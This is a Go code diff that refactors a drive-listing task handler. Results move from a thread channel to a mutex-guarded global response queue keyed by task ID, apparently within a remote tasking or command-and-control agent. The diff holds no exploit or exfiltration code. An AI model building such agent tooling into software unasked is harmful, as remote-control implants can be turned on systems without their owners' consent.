@@ -4,7 +4,11 @@ import (
 	"encoding/json"
 
 	"pkg/utils/structs"
+	"sync"
+	"pkg/profiles"
 )
+
+var mu sync.Mutex
 
 type Drive struct {
 	Name             string `json:"name"`
@@ -16,30 +20,31 @@ type Drive struct {
 }
 
 //Run - Function that executes the shell command
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.TaskItem = task
-	// args := &Arguments{}
-	// err := json.Unmarshal([]byte(task.Params), args)
-	// if err != nil {
-	// 	tMsg.TaskResult = []byte(err.Error())
-	// 	tMsg.Error = true
-	// 	threadChannel <- tMsg
-	// 	return
-	// }
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
+	
 
 	res, err := listDrives()
 
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	driveJson, err := json.MarshalIndent(res, "", "    ")
-	tMsg.TaskResult = driveJson
-	tMsg.Error = false
-	tMsg.Completed = true
-	threadChannel <- tMsg
+	msg.UserOutput = string(driveJson)
+	msg.Completed = true
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
